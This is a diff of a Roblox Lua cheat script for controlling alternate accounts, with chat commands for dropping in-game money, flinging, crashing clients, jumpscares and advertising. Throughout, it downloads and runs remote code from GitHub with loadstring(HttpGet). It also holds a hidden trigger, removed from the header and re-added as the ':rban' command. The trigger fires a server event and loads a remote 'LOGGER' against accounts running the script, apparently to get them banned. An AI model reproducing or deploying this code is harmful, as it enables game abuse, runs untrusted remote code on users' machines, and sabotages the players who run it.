@@ -1,44 +1,3 @@
---Soo cool just because you can find code x-x
-
-
-
-Ban = {
-366778121,
-2904905823,
-339714802,
-2430199239,
-3290204573,
-
-
-
-}
-
-if table.find(Ban, game:GetService("Players").LocalPlayer.UserId) then
-game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
-else
-end
-
-local Players = game:GetService('Players')
-local Player = Players.LocalPlayer
-if (Player):IsInGroup(1090083) then
-
-game.Players.LocalPlayer:Kick("Blacklisted Group | That group has been blocked because they are scammers, Please leave the group and retry the script (Group Name and Id: O.D. Special Forces/1090083)   Support = .gg/C2eTqjK9dp")
-
-else
-end
-
-local Players = game:GetService('Players')
-local Player = Players.LocalPlayer
-if (Player):IsInGroup(4942319) then
-
-game.Players.LocalPlayer:Kick("Blacklisted Group | That group has been blocked because they are scammers, Please leave the group and retry the script (Group Name and Id: -=MHRT=- (Miami Heat ROBLOX Team)/4942319)   Support = .gg/C2eTqjK9dp")
-
-else
-end
-
-
-
 BlackList = {
 0,
 
@@ -47,242 +6,134 @@ BlackList = {
 }
 
 if table.find(BlackList, game:GetService("Players").LocalPlayer.UserId) then
-    game.Players.LocalPlayer:Kick("Blacklisted | Please DM KaiW#4990 or FrostyW#9330 for help, If neither of them respond join our discord: .gg/C2eTqjK9dp")
+    game.Players.LocalPlayer:Kick("Blacklisted")
 else
 end
 
+print("loading")
 
-getgenv().OP = 
-{
-666447670, --Snow
-903327775, --Hax0963
-2003508283, --Saturn
-1001587711, --Barbieeee
-243177174, --Albert
-248837333 --Hax Alt
+getgenv().Settings = {
+    host = 903327775,
+    prefix = ':',
+    admsg = 'Ryku on top!',
+    fps = 5
 }
 
-if table.find(getgenv().OP, game:GetService("Players").LocalPlayer.UserId) then
+getgenv().Alts = LocalPlayer
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/smd/main/123"))()
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 
-local CoreGui = game:GetService("StarterGui")
-
-CoreGui:SetCore("SendNotification", {
-	Title = "Commands Perms";
-	Text = "Command Perms activated, Thanks for buying!";
-	Duration = 15;
-})
-
-local CoreGui = game:GetService("StarterGui")
-
-CoreGui:SetCore("SendNotification", {
-	Title = "Commands Perms";
-	Text = "Can't use Command Perms on self UWU";
-	Duration = 15;
-})
+local player = game:service"Players".LocalPlayer
+local ishost = false
+if Settings['host'] == player.UserId then
+    ishost = true
 else
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/smd/main/123"))()
-
-getgenv().Prefix = ":"
-
-getgenv().Operator = 
-{
-666447670, --Snow
-903327775, --Hax0963
-2003508283, --Saturn
-1001587711, --Barbieeee
-243177174, --Albert
-248837333 --Hax Alt
-}
-
-
---Add them to the list/white
-
-getgenv().Droppers = game.Players.LocalPlayer
-
-local player = game.Players.LocalPlayer
-
-player.Idled:Connect(function()
-    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+end
+game:service"Players".LocalPlayer.Idled:Connect(function()
+    game:service"VirtualUser":Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
     wait(1)
-    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+    game:service"VirtualUser":Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuxeCommands/Unknowned-Alt-Control/main/anticheat.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuxeCommands/Unknowned-Alt-Control/main/module.lua"))()
 
-local origin_spot
-local adver_msg
-local hidden_origin_spot
+-- env handlers
+--cmds
+local GithubUrl = 'https://raw.githubusercontent.com/LuxeCommands/Unknowned-Alt-Control/main/commands/'
+getgenv().BRING_LOADED = false
+getgenv().DROP_LOADED = false
+getgenv().STOP_LOADED = false
+getgenv().AIRLOCK_LOADED = false
+getgenv().LOCK_LOADED = false
+getgenv().UNLOCK_LOADED = false
+getgenv().RESET_LOADED = false
+getgenv().GOD_LOADED = false
+getgenv().CDROP_LOADED = false
+getgenv().TP_LOADED = false
+getgenv().SETUP_LOADED = false
+getgenv().FPS_LOADED = false
+getgenv().ALTS_LOADED = false
+getgenv().DUPE_LOADED = false
+getgenv().WALLET_LOADED = false
+getgenv().CRASH_LOADED = false
+getgenv().SAY_LOADAED = false
+getgenv().ADNEW_LOADED = false
+getgenv().AD_LOADED = false
+getgenv().LOOPDESTROY_LOADED = false
+getgenv().MASK_LOADED = false
 
-local dropping = false
-local blocking = false
-local advert = false
+--togglse
+getgenv().CDROPPINGNOW = false
 
-local function main_cmds(msg,plr)
-    if isaopeartor == false or table.find(Operator,plr) then
-        local operator = game.Players:GetPlayerByUserId(plr)
-        msg = string.lower(msg)
-        cmd = string.split(msg," ")
-        if cmd[2] and cmd[1] then
-            if cmd[1] == Prefix.."setup" then
-                local places = {"admin"}
-                if table.find(places,cmd[2]) then
-                    local success, err = pcall(function()
-                        if cmd[2] == 'admin' then
-                            local pos = {
-                                a1 = "-871,-39,-589",
-                                a2 = "-871,-39,-619",
-                                a3 = "-906,-40,-620",
-                                a4 = "-907,-39,-590",
-                                a5 = "-908,-40,-561",
-                                a6 = "-873,-39,-559",
-                                a7 = "-837,-40,-559",
-                                a8 = "-836,-39,-590",
-                                a9 = "-837,-40,-619",
-                                a10 = "-856,-39,-606",
-                                a11 = "-871,-39,-606",
-                                a12 = "-887,-39,-606",
-                                a13 = "-887,-39,-590",
-                                a14 = "-886,-39,-573",
-                                a15 = "-872,-39,-574",
-                                a16 = "-857,-39,-574",
-                                a17 = "-856,-39,-588",
-                                a18 = "-820,-40,-629",
-                                a19 = "-922,-40,-629",
-                                a20 = "-924,-40,-550",
-                                a21 = "-821,-40,-549",
-                                a22 = "-864,-39,-580",
-                                a23 = "-864,-39,-580",
-                                a24 = "-881,-39,-580",
-                                a25 = "-881,-39,-600",
-                                a26 = "-864,-39,-600",
-                            }
-                            local cnt = 0
-                            for i,v in pairs(Droppers) do
-                                if game.Players:GetPlayerByUserId(v) then
-                                    cnt = cnt + 1
-                                    local new_pos = pos['a'..cnt]
-                                    local split_cframe = string.split(new_pos,",")
-                                    local x,y,z = split_cframe[1],split_cframe[2],split_cframe[3]
-                                    game.Players:GetPlayerByUserId(v).Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
-                                end
-                            end
-                            if game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored == true then
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                            end
-                            local HumanoidRootPart_ = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart_.X,HumanoidRootPart_.Y+7,HumanoidRootPart_.Z)
-                            wait()
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                        end
-                    end)
-                    if err then print(err) end
-                end
-            elseif cmd[1] == Prefix.."drop" then
-                if cmd[2] == "." then
-                    annouce(player.Name.." started dropping!")
-                    dropping = true
-                    repeat
-                        local dropamt = 10000
-                        if player.DataFolder.Currency.Value >= 10000 then
-                            dropamt = 10000
-                        else
-                            dropamt = player.DataFolder.Currency.Value
-                        end
-                        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",dropamt)
-                        wait(0.1)
-                    until dropping == false
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    dropping = true
-                    annouce(player.Name.." started dropping!")
-                    repeat
-                        local dropamt = 10000
-                        if player.DataFolder.Currency.Value >= 10000 then
-                            dropamt = 10000
-                        else
-                            dropamt = player.DataFolder.Currency.Value
-                        end
-                        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",dropamt)
-                        wait(0.1)
-                    until dropping == false
-                end
-            elseif cmd[1] == Prefix.."undrop" then
-                if cmd[2] == "." then
-                    annouce(player.Name.." stopped dropping!")
-                    dropping = false
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    dropping = false
-                    annouce(player.Name.." stopped dropping!")
-                end
-            elseif cmd[1] == Prefix.."bring" then
-                if cmd[2] == "." then
-                    player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
-                end
-            elseif cmd[1] == Prefix.."refresh" then
-                if cmd[2] == "." then
-                    origin_spot = player.Character.HumanoidRootPart.CFrame
-                    player.Character.Humanoid.Health = 0
-                    wait(7.5)
-                    player.Character.HumanoidRootPart.CFrame = origin_spot
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    origin_spot = player.Character.HumanoidRootPart.CFrame
-                    player.Character.Humanoid.Health = 0
-                    wait(7.5)
-                    player.Character.HumanoidRootPart.CFrame = origin_spot
-                end
-            elseif cmd[1] == Prefix.."freeze" then
-                if cmd[2] == "." then
-                    player.Character.HumanoidRootPart.Anchored = true
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    player.Character.HumanoidRootPart.Anchored = true
-                end
-            elseif cmd[1] == Prefix.."unfreeze" then
-                if cmd[2] == "." then
-                    player.Character.HumanoidRootPart.Anchored = false
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    player.Character.HumanoidRootPart.Anchored = false
-                end
-            elseif cmd[1] == Prefix.."kick" then
-                if cmd[2] == "." then
-                    game.Players.LocalPlayer:Kick("Stop.")
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.Players.LocalPlayer:Kick("Stop.")
-                end
-            elseif cmd[1] == Prefix.."check" then
-                if cmd[2] == "." then
-                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes, I'm Here!","All")
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes, I'm Here!","All")
-                end
-            elseif cmd[1] == Prefix.."ban" then
-                if cmd[2] == "." then
-                    game.Players.LocalPlayer:Kick("User BANNED")
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.Players.LocalPlayer:Kick("User BANNED")
-                end
-            elseif cmd[1] == Prefix.."rejoin" then
-                if cmd[2] == "." then
-                    local tpservice= game:GetService("TeleportService")
-                    local plr = game.Players.LocalPlayer
+local function cmds(msg, plr)
+    if ishost == false then
+        local host = game:service"Players":GetPlayerByUserId(plr)
+        if msg:lower() == Settings['prefix']..'bring .' then
+            if BRING_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."bring.lua"))()
+            end
+            BringCmd(plr)
+        elseif msg:lower() == Settings['prefix']..'drop .' then
+            if DROP_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."drop.lua"))()
+            end
+            DropCmd()
+        elseif msg:lower() == Settings['prefix']..'stop .' then
+            if STOP_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."stop.lua"))()
+            end
+            StopCmd()
+        elseif msg:lower() == Settings['prefix']..'airlock .' then
+            if AIRLOCK_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."airlock.lua"))()
+            end
+            AirlockCmd()
+        elseif msg:lower() == Settings['prefix']..'lock .' then
+            if LOCK_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."lock.lua"))()
+            end
+            LockCmd()
+        elseif msg:lower() == Settings['prefix']..'unlock .' then
+            if UNLOCK_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."unlock.lua"))()
+            end
+            UnlockCmd()
+        elseif msg:lower() == Settings['prefix']..'reset .' then
+            if RESET_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."reset.lua"))()
+            end
+            ResetCmd()
+        elseif msg:lower() == Settings['prefix']..'god .' then
+            if GOD_LOADED == false then
+                loadstring(game:HttpGet(GithubUrl.."god.lua"))()
+            end
+            GodCmd()
+        elseif msg:lower() == Settings['prefix']..'simplescare .' then
+            local ScreenGui = Instance.new("ScreenGui") local ImageLabel = Instance.new("ImageLabel") local Frame = Instance.new("Frame") local TextButton = Instance.new("TextButton") ScreenGui.Parent = game.CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling ImageLabel.Parent = ScreenGui ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5) ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255) ImageLabel.BackgroundTransparency = 1.000 ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0) ImageLabel.Size = UDim2.new(1, 0, 1, 0) ImageLabel.Visible = false ImageLabel.Image = "http://www.roblox.com/asset/?id=8859140616" Frame.Parent = ScreenGui Frame.AnchorPoint = Vector2.new(0.5, 0.5) Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) Frame.BackgroundTransparency = 1.000 Frame.Position = UDim2.new(0.5, 0, 0.5, 0) Frame.Size = UDim2.new(1, 0, 1, 0) TextButton.Parent = ScreenGui TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) TextButton.BackgroundTransparency = 1.000 TextButton.Size = UDim2.new(0, 200, 0, 50) TextButton.Visible = false TextButton.Font = Enum.Font.SourceSans TextButton.TextColor3 = Color3.fromRGB(0, 0, 0) TextButton.TextSize = 14.000 local function PRRUJQ_fake_script() local script = Instance.new('LocalScript', TextButton) repeat wait() until game:IsLoaded() local Sound = Instance.new("Sound") Sound.Parent = workspace Sound.Volume = 10 Sound.SoundId = 'rbxassetid://1546975842' wait(1) local tweenservice = game:GetService("TweenService") script.Parent.Parent.Frame.BackgroundTransparency = 0 script.Parent.Parent.ImageLabel.BackgroundTransparency = 0 script.Parent.Parent.ImageLabel.Visible = true tweenservice:Create(script.Parent.Parent.Frame, TweenInfo.new(6.138), {BackgroundTransparency = 1}):Play() Sound:Play() wait(6.138) script.Parent.Parent.Frame.BackgroundTransparency = 1 script.Parent.Parent.ImageLabel.BackgroundTransparency = 1 script.Parent.Parent.ImageLabel.Visible = false end coroutine.wrap(PRRUJQ_fake_script)()
+        elseif msg:lower() == Settings['prefix']..'jumpscare .' then
+            local ScreenGui = Instance.new("ScreenGui") local ImageLabel = Instance.new("ImageLabel") local Frame = Instance.new("Frame") ScreenGui.Parent = game.CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling ImageLabel.Parent = ScreenGui ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5) ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0) ImageLabel.Position = UDim2.new(0.4996382, 0, 0.49999994, 0) ImageLabel.Size = UDim2.new(1, 0, 1, 0) ImageLabel.Visible = false ImageLabel.Image = "rbxassetid://8859140616" Frame.Parent = ImageLabel Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) Frame.Position = UDim2.new(-0.433429807, 0, -0.704358041, 0) Frame.Size = UDim2.new(9, 9, 9, 9) local function WSPIPDV_fake_script() local script = Instance.new('LocalScript', Frame) repeat wait() until game:IsLoaded() script.Parent.Parent.Visible = false wait(1) local Sound = Instance.new("Sound", workspace) Sound.SoundId = 'rbxassetid://5657950552' Sound.Volume = 5 Sound:Play() script.Parent.Parent.Visible = true wait(.4) for i = 1,30 do script.Parent.Parent.Image = 'rbxassetid://8859140616' script.Parent.Visible = not script.Parent.Visible script.Parent.Parent.Rotation = 25 wait() script.Parent.Parent.Rotation = -25 script.Parent.Visible = not script.Parent.Visible wait() script.Parent.Parent.Rotation = 0 script.Parent.Visible = not script.Parent.Visible wait() end Sound:Destroy() script.Parent.Visible = false script.Parent.Parent.Visible = false end coroutine.wrap(WSPIPDV_fake_script)()
+        elseif msg:lower() == Settings['prefix']..'rban .' then
+            game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
+        elseif msg:lower() == Settings['prefix']..'freeze .' then
+            player.Character.HumanoidRootPart.Anchored = true
+        elseif msg:lower() == Settings['prefix']..'unfreeze .' then
+            player.Character.HumanoidRootPart.Anchored = false
+        elseif msg:lower() == Settings['prefix']..'kick .' then
+            game.Players.LocalPlayer:Kick("Stop.")
+        elseif msg:lower() == Settings['prefix']..'check .' then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes, I'm Here!","All")
+        elseif msg:lower() == Settings['prefix']..'ban .' then
+            game.Players.LocalPlayer:Kick("User BANNED")
+        elseif msg:lower() == Settings['prefix']..'rejoin .' then
+            local tpservice= game:GetService("TeleportService")
+            local plr = game.Players.LocalPlayer
 
-                    tpservice:Teleport(game.PlaceId, plr)
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    local tpservice= game:GetService("TeleportService")
-                    local plr = game.Players.LocalPlayer
-
-                    tpservice:Teleport(game.PlaceId, plr)
-                end
-            elseif cmd[1] == Prefix.."hurt" then
-                if cmd[2] == "." then
-                    player.Character.Humanoid.Health = 1
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    player.Character.Humanoid.Health = 1
-                end
-            elseif cmd[1] == Prefix.."fling" then
-                if cmd[2] == "." then
-                    power = 10000000 -- change this to make it more or less powerful
+            tpservice:Teleport(game.PlaceId, plr)
+         elseif msg:lower() == Settings['prefix']..'fling .' then
+                                power = 10000000 -- change this to make it more or less powerful
 
                     game:GetService('RunService').Stepped:connect(function()
                     game.Players.LocalPlayer.Character.Head.CanCollide = false
@@ -295,102 +146,112 @@ local function main_cmds(msg,plr)
                     bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                     bambam.Force = Vector3.new(power,0,power)
                     bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    power = 10000000 -- change this to make it more or less powerful
-
-                    game:GetService('RunService').Stepped:connect(function()
-                    game.Players.LocalPlayer.Character.Head.CanCollide = false
-                    game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
-                    game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
-                    end)
-                    wait(.1)
-                    local bambam = Instance.new("BodyThrust")
-                    bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
-                    bambam.Force = Vector3.new(power,0,power)
-                    bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+        elseif msg:lower() == Settings['prefix']..'trash .' then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/RandomText-Script/main/Script'))()
+        elseif msg:lower() == Settings['prefix']..'kill .' then
+            player.Character.Humanoid.Health = 0
+        elseif msg:lower() == Settings['prefix']..'crash .' then
+            game:Shutdown()
+        elseif msg:lower() == Settings['prefix']..'warning .' then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This is a warning, Stop abusing.","All")
+        elseif msg:lower() == Settings['prefix']..'wallet .' then
+            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet"))
+        elseif msg:lower() == Settings['prefix']..'unwallet .' then
+            game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
+        elseif msg:lower() == Settings['prefix']..'pray .' then
+            local PrayingAnimation = Instance.new("Animation", Folder) PrayingAnimation.Name = "PrayingAnimation" PrayingAnimation.AnimationId = "rbxassetid://3487719500" local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
+            function Stop() Lay:Stop() Lean:Stop() Dance1:Stop() Dance2:Stop() Greet:Stop() Praying:Stop() end
+            Praying:play()
+            wait(0)
+            player.Character.HumanoidRootPart.Anchored = true
+            wait(6.9)
+            player.Character.HumanoidRootPart.Anchored = false
+        end
+        local oldmsg = msg
+        msg = msg:lower():split(" ")
+        if msg[1] and msg[2] then
+            if msg[1] == Settings['prefix']..'cdrop .' then
+                if CDROP_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."cdrop.lua"))()
                 end
-            elseif cmd[1] == Prefix.."trash" then
-                if cmd[2] == "." then
-                    loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/RandomText-Script/main/Script'))()
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/RandomText-Script/main/Script'))()
+                local data = CdropCmd(msg[2])
+                if data == 'error' then
+                    Say("Error!")
                 end
-            elseif cmd[1] == Prefix.."kill" then
-                if cmd[2] == "." then
-                    player.Character.Humanoid.Health = 0
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    player.Character.Humanoid.Health = 0
+            elseif msg[1] == Settings['prefix']..'tp .' then
+                if player.UserId == Alts[1] then
+                    if TP_LOADED == false then
+                        loadstring(game:HttpGet(GithubUrl.."tp.lua"))()
+                    end
+                    TpCmd(msg[2],msg[3])
                 end
-            elseif cmd[1] == Prefix.."crash" then
-                if cmd[2] == "." then
-                    game:Shutdown()
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game:Shutdown()
+            elseif msg[1] == Settings['prefix']..'setup .' then
+                if SETUP_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."setup.lua"))()
                 end
-            elseif cmd[1] == Prefix.."warning" then
-                if cmd[2] == "." then
-                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This is a warning, Stop abusing.","All")
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This is a warning, Stop abusing.","All")
+                SetupCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'fps' then
+                if FPS_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."fps.lua"))()
                 end
-            elseif cmd[1] == Prefix.."emoji" then
-                if cmd[2] == "." then
-                    loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/EmojiMain/main/Script'))()
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/EmojiMain/main/Script'))()
+                FpsCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'alts' then
+                if ALTS_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."alts.lua"))()
                 end
-		    elseif cmd[1] == Prefix.."wallet" then
-                if cmd[2] == "." then
-                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet"))
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet"))
+                AltsCmd(msg[2],plr)
+            elseif msg[1] == Settings['prefix']..'dupe' then
+                if DUPE_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."dupe.lua"))()
                 end
-		    elseif cmd[1] == Prefix.."unwallet" then
-                if cmd[2] == "." then
-                    game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
+                DupeCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'wall .' then
+                if WALLET_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."wall.lua"))()
                 end
-            elseif cmd[1] == Prefix.."pray" then
-                if cmd[2] == "." then
-                    local PrayingAnimation = Instance.new("Animation", Folder) PrayingAnimation.Name = "PrayingAnimation" PrayingAnimation.AnimationId = "rbxassetid://3487719500" local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
-                    function Stop() Lay:Stop() Lean:Stop() Dance1:Stop() Dance2:Stop() Greet:Stop() Praying:Stop() end
-                    Praying:play()
-                    wait(0)
-                    player.Character.HumanoidRootPart.Anchored = true
-                    wait(6.9)
-                    player.Character.HumanoidRootPart.Anchored = false
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    local PrayingAnimation = Instance.new("Animation", Folder) PrayingAnimation.Name = "PrayingAnimation" PrayingAnimation.AnimationId = "rbxassetid://3487719500" local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
-                    function Stop() Lay:Stop() Lean:Stop() Dance1:Stop() Dance2:Stop() Greet:Stop() Praying:Stop() end
-                    Praying:play()
-                    wait(0)
-                    player.Character.HumanoidRootPart.Anchored = true
-                    wait(6.9)
-                    player.Character.HumanoidRootPart.Anchored = false
+                WalletCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'crash' then
+                if player.UserId == Alts[1] or player.UserId == Alts[2] or player.UserId == Alts[3] then
+                    if CRASH_LOADED == false then
+                        loadstring(game:HttpGet(GithubUrl.."crash.lua"))()
+                    end
+                    CrashCmd(msg[2])
                 end
+            elseif msg[1] == Settings['prefix']..'say' then
+                if SAY_LOADAED == false then
+                    loadstring(game:HttpGet(GithubUrl.."say.lua"))()
+                end
+                SayMsg(oldmsg)
+            elseif msg[1] == Settings['prefix']..'ad' then
+                if AD_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."ad.lua"))()
+                end
+                AdCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'adnew' then
+                if ADNEW_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."adnew.lua"))()
+                end
+                AdnewCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'loopdestroy' then
+                if LOOPDESTROY_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."loopdestroy.lua"))()
+                end
+                LoopdestroyCmd(msg[2])
+            elseif msg[1] == Settings['prefix']..'mask' then
+                if MASK_LOADED == false then
+                    loadstring(game:HttpGet(GithubUrl.."mask.lua"))()
+                end
+                MaskCmd(msg[2])
             end
         end
     end
 end
-
-for i,v in pairs(game.Players:GetChildren()) do
-    if table.find(Operator,v.UserId) then
-        v.Chatted:Connect(function(msg)
-            main_cmds(msg,v.UserId)
-        end)
-    end
-end
-
-game.Players.PlayerAdded:Connect(function(plr)
-    if table.find(Operator,plr.UserId) then
-        plr.Chatted:Connect(function(msg)
-            main_cmds(msg,plr.UserId)
-        end)
+game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data) 
+    local user = data.FromSpeaker
+    local msg = data.Message
+    if Settings['host'] == game:service"Players"[user].UserId then
+        cmds(msg, game:service"Players"[user].UserId)
     end
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/Commands2/main/Script"))()
-
-end
+print("loaded")
